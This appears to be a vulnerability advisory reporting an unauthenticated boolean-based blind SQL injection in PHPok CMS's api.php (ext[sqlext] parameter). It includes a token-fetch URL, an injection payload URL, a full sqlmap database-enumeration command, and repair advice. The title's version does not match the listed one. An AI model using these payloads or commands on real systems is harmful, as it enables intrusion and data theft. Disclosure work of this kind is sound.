# PHPok cms system V1.0 /framework/modle/call.php SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ phpok cms system
## Vendor Homepage
+  [homepage](https://github.com/qinggan/phpok)
# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ Hacker0xOne - [@Hacker0xone](https://github.com/Hacker0xone/)
## Vulnerable File
+ /framework/modle/call.php
## VERSION(S)
+ V6.4.003
# Software Link
+ [Download Source Code](https://codeload.github.com/qinggan/phpok/zip/refs/heads/master)
# PROBLEM TYPE
## Vulnerability Type
+ SQL injection
## Root Cause
+ A SQL injection vulnerability was found in the '/framework/modle/call.php' file of the 'phpok cms system' project. The reason for this issue is that attackers inject malicious code from the parameter '#1*' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.
## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.
## DESCRIPTION
+ During the security review of "phpok cms system", Hacker0xOne discovered a critical SQL injection vulnerability in the "/framework/modle/call.php" file. This vulnerability stems from insufficient user input validation of the '#1*' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.
# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## ulnerability type:
+ boolean-based blind
## Vulnerability location:
+ '#1*' parameter
## Payload:
```bash
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:2223/api.php?c=index&f=phpok&token=d78658wLmW5Q1bOllas7lIt1SGOddmp6dH zkBpBDASkPJAUeDbNlHcqsKNLnEa7hn7JDjsaijq5SAk15K&ext[sqlext]=1 AND 3668=3668
    Vector: AND [INFERENCE]
```
# Vulnerability reproduction
## Send POC to obtain token value
```bash
http://localhost:2222/api.php?c=index&f=token&id=m_picplayer
```
+ <img width="942" alt="image" src="https://github.com/user-attachments/assets/e7cbef83-ba6b-4fbf-89f7-d7eaf1cfff8e" />

## Injecting payload into sqlmap
```bash
sqlmap -u 'http://localhost:2223/api.php?c=index&f=phpok&token=d78658wLmW5Q1bOllas7lIt1SGOddmp6dH+zkBpBDASkPJAUeDbNlHcqsKNLnEa7hn7JDjsaijq5SAk15K&ext[sqlext]=1*' --dbms mysql -v 3 --tech B --thread 10 --tamper between --dbs
```
+ <img width="1728" alt="image-1" src="https://github.com/user-attachments/assets/7e5525a7-e7c9-4589-8ae1-1afb4aca2b3e" />

+ <img width="1200" alt="image-2" src="https://github.com/user-attachments/assets/2d3f1706-7c59-422b-b168-479530fa76d5" />

# Suggested repair
1. Use prepared statements and parameter binding:
Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. Input validation and filtering:
Strictly validate and filter user input data to ensure it conforms to the expected format.
3. Minimize database user permissions:
Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. Regular security audits:
Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
